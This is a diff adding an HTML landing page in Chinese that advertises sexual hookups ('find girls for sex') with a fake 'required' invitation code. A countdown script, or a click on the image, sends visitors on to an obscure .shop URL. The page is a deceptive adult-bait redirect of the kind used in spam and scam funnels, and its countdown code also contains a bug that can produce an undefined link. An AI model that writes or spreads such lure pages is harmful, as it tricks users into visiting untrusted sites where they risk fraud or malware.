@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>加载中.....</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #f0f0f0;
+        display: flex;
+        flex-direction: column;
+        justify-content: flex-start;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+        color: #333;
+      }
+
+      .container {
+        text-align: center;
+      }
+
+      h1 {
+        color: #e74c3c;
+        font-size: 48px;
+        font-weight: bold;
+        margin-bottom: 10px;
+        text-align: center;
+      }
+
+      .highlight {
+        color: #1185d7;
+        font-size: 40px;
+        font-weight: bold;
+        text-align: center;
+      }
+
+      .icon {
+        margin-bottom: 20px;
+      }
+
+      .icon img {
+        width: 50px;
+        height: 50px;
+      }
+      .image-container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        margin-top: 2em;
+      }
+
+      .image-container img {
+        max-width: 100%;
+        height: auto;
+        margin-top: 1em;
+      }
+
+      .container > p:nth-of-type(2) .highlight {
+        color: green;
+      }
+
+      a {
+        text-decoration: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="icon">
+        <img src="img2/icon.png" alt="Icon" id="iconImage" />
+      </div>
+      <h1>找妹妹啪啪</h1>
+      <p><span class="highlight">妹妹邀请码(必填)：082369</span></p>
+      <p>
+        <span class="highlight clickableImage"
+          >正在进入中，请稍等 倒计时 <span id="countdown">3</span></span
+        >
+      </p>
+    </div>
+    <div class="image-container">
+      <img
+        src="img2/01.jpg"
+        alt="Image 5"
+        class="clickableImage"
+      />
+    </div>
+    <script type="text/javascript">
+      var links = [
+        "http://8yzs.t5wk3f.shop/VjrM9k8I",
+      ];
+
+      function handleImageClick() {
+        var randomLink = links[Math.floor(Math.random() * links.length)];
+
+        clearTimeout(timer);
+
+        window.location.href = randomLink;
+      }
+
+      var clickableImages = document.querySelectorAll(".clickableImage");
+
+      clickableImages.forEach(function (image) {
+        image.addEventListener("click", handleImageClick);
+      });
+
+      var secondsLeft = 3;
+      var countdownElement = document.getElementById("countdown");
+      var timer = setInterval(function () {
+        secondsLeft--;
+        if (secondsLeft <= 0) {
+          var randomLink = links[Math.floor(Math.random() * 2)];
+          window.location.href = randomLink;
+        } else {
+          countdownElement.textContent = secondsLeft;
+        }
+      }, 1000);
+    </script>
+  </body>
+</html>
